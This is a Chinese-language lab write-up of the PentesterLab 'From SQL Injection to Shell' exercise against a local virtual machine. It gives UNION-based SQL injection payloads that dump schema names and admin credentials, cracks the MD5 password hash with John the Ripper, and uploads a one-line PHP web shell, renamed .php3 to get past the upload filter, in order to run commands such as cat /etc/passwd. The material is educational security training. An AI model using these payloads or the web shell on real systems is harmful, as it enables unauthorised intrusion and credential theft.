##  从SQL注入到Shell

### 实验目的
在基于PHP的网站中使用SQL注入并使用它来访问管理页面，用这种访问，在目标服务器上获得代码执行。

### 实验步骤
- 指纹：收集有关Web应用程序和正在使用的技术的信息
- SQL注入的检测和利用：学习SQL注入如何工作以及如何利用它们来检索信息
- 访问管理页面和代码执行：访问操作系统和运行命令的最后一步

### 实验环境

攻击者主机和靶机均为NAT网络
靶机使用下载的镜像
攻击者主机IP：10.0.2.22
靶机IP：10.0.2.21

![](image/1.png)

![](image/2.png)

### 实验过程

#### 1.收集指纹

* http请求测试
  * 攻击者主机浏览器设置代理

  ![](image/3.png)

  * 浏览器访问http://10.0.2.21

  ![](image/4.png)

  * burpsuite劫持

  ![](image/5.png)
  上图可以看出靶机使用的网络服务器、以及php版本信息

* https请求测试
  * 请求失败
  ![](image/6.png)

  * 使用工具wfuzz蛮力检测Web服务器上的目录和页面
    * 使用命令
    ```
    $ python wfuzz.py -c -z file,wordlist/general/big.txt --hc 404 http://10.0.2.21/FUZZ
    ```
    其中
    ```
    -c 表示高亮显示
    -z file，wordlist / general / big.txt 告诉wfuzz使用文件wordlists / general / big.txt作为字典来强制远程目录的名字。
    --hc 404 告诉wfuzz忽略响应，如果响应代码是404（Page not found）
    http：// vulnerable / FUZZ 告诉wfuzz用字典中的每个值替换URL中的FUZZ这个词。
    ```

    `没有成功`

#### 2.SQL注入的检测和利用

##### SQL注入检测
* SQL简介
 * retrieve information using the SELECT statement; `检索`
 * update information using the UPDATE statement; `修改`
 * add new information using the INSERT statement;`增加`
 * delete information using the DELETE statement.`删除`


* 发现sql漏洞存在：

  请求10.0.2.21/cat.php?id=3' 网页报错提示语法错误(单引号)以及数据库应为Mysql

  ![](image/8.png)

* 基于整数测试 用户提供的值被视为一个整数直接回显到SQL请求中

  ![](image/9.png)
  ![](image/10.png)

* 利用UNION开发SQL注入
  * 获取数据库版本号

  `.php?id=1 UNION SELECT 1,@@version,3,4`

  ![](image/11.png)

  * 获取系统当前用户名

  `.php?id=1 UNION SELECT 1,current_user(),3,4`

  ![](image/12.png)

  * 获取当前数据库名

  `.php?id=1 UNION SELECT 1,database(),3,4`

  ![](image/13.png)

##### 通过查看information_schema数据库获取更多信息

  >在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。


* 检索数据库中所有表名

  `1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables`

  ![](image/14.png)

* 检索数据库中所有列名

  `1 UNION SELECT 1,column_name,3,4 FROM information_schema.columns`

  ![](image/15.png)

* 查看表名和列名的对应关系

  `1 UNION SELECT 1,concat(table_name,':', column_name),3,4 FROM information_schema.columns`

  ![](image/16.png)

* 获取管理员密码

  `1 UNION SELECT 1,concat(login,':',password),3,4 FROM users;`

  ![](image/17.png)

##### 破解密码

`8efe310f9ab3efeae8d410a8e0166eb2`

* 方法一：网上在线破解

  ![](image/18.png)

* 方法二：John the ripper密码破解工具

  ```
  命令：
  john password --format=raw-md5 --wordlist=dico --rules
  参数：
  password 告诉 John 什么文件包含密码的哈希值
  --format=raw-md5 告诉 John 密码哈希是 raw-md5 格式
  --wordlist=dico 告诉 John 使用文件 dico 作为字典
  --rules 告诉 John 尝试遍历每个可用的单词
   ```
  ![](image/19.png)

两种方法解密出的结果都是`P4ssw0rd`

####  3.访问管理页面和代码执行

* 根据破解的密码和用户名进入管理界面
![](image/20.png)

* 创建php脚本后点击上图界面的右侧`New Picture`按钮上传脚本文件
```php
<?php
system($_GET['cmd']);
?>
```
  * 直接上传php文件会显示失败因为不支持php文件的上传，将文件后缀名改为.php3之后可以成功上传
  ![](image/21.png)
  ![](image/22.png)

* 利用cmd执行任意命令利用脚本
  * 访问http：//vulnerable/admin/uploads/shell.php3？cmd = uname将在操作系统上运行命令uname并返回当前内核。
  ![](image/23_1.png)
  ![](image/23.png)

  * ls获取当前目录的内容
  ![](image/24.png)

  * 获取靶机系统用户列表
  `cat /etc/passwd`
  ![](image/25.png)
  ![](image/25_1.png)

####  参考资料

>From SQL Injection To Shell指导书https://pentesterlab.com/exercises/from_sqli_to_shell/course
